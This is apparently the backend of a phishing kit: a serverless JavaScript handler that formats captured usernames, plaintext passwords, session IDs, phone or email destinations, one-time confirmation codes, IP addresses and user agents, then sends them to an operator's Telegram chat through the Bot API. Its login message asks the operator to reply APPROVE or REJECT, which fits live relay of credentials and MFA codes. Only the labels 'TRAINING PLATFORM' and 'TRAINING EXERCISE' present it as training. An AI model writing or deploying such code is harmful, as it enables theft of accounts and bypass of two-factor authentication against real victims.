// api/telegram.js
export default async function handler(req, res) {
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { action, data } = req.body;
  
  // Get bot token from environment variables
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  // Validate configuration
  if (!botToken || !chatId) {
    console.error('Missing Telegram configuration');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let message = '';
  let parseMode = 'HTML';

  // Format message based on action
  switch (action) {
    case 'domain_detection':
      message = formatDomainDetection(data);
      break;
    case 'login_attempt':
      message = formatLoginAttempt(data);
      break;
    case 'auth_attempt':
      message = formatAuthAttempt(data);
      break;
    case 'code_submitted':
      message = formatCodeSubmitted(data);
      break;
    default:
      return res.status(400).json({ error: 'Invalid action' });
  }

  try {
    await sendTelegramMessage(botToken, chatId, message, parseMode);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ error: 'Failed to send message' });
  }
}

// ====== MESSAGE FORMATTING FUNCTIONS ======

function formatDomainDetection(data) {
  const { url, domain, isFree, timestamp, userAgent, ip } = data;
  return `
🌐 <b>DOMAIN DETECTED</b>
─────────────────
🔗 <b>URL:</b> ${url}
🏷️ <b>Domain:</b> ${domain}
📊 <b>Type:</b> ${isFree ? '⚠️ FREE DOMAIN' : '✅ PURCHASED DOMAIN'}
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
<b>📍 TRAINING PLATFORM</b>
`;
}

function formatLoginAttempt(data) {
  const { username, password, timestamp, userAgent, ip } = data;
  return `
🔐 <b>LOGIN ATTEMPT - APPROVAL REQUIRED</b>
─────────────────
👤 <b>Username:</b> ${username}
🔑 <b>Password:</b> ${password}
🆔 <b>Session ID:</b> ${data.sessionId || 'N/A'}
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
<b>⚠️ ACTION REQUIRED:</b>
Reply with:
✅ <code>APPROVE</code> - Allow login
❌ <code>REJECT</code> - Deny login
─────────────────
`;
}

function formatAuthAttempt(data) {
  const { method, destination, timestamp, userAgent, ip } = data;
  return `
📱 <b>AUTHENTICATION REQUEST</b>
─────────────────
📌 <b>Method:</b> ${method === 'sms' ? '📱 SMS' : '✉️ EMAIL'}
📧 <b>Destination:</b> ${destination}
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
<b>📍 TRAINING EXERCISE</b>
`;
}

function formatCodeSubmitted(data) {
  const { code, timestamp, userAgent, ip } = data;
  return `
🔢 <b>CONFIRMATION CODE SUBMITTED</b>
─────────────────
🔑 <b>Code:</b> <code>${code}</code>
⏰ <b>Time:</b> ${timestamp}
🖥️ <b>User Agent:</b> ${userAgent}
🌍 <b>IP:</b> ${ip || 'Not available'}
─────────────────
<b>📍 TRAINING EXERCISE</b>
`;
}

async function sendTelegramMessage(botToken, chatId, message, parseMode = 'HTML') {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: parseMode,
      disable_web_page_preview: true
    })
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Telegram API error: ${error}`);
  }

  return response.json();
}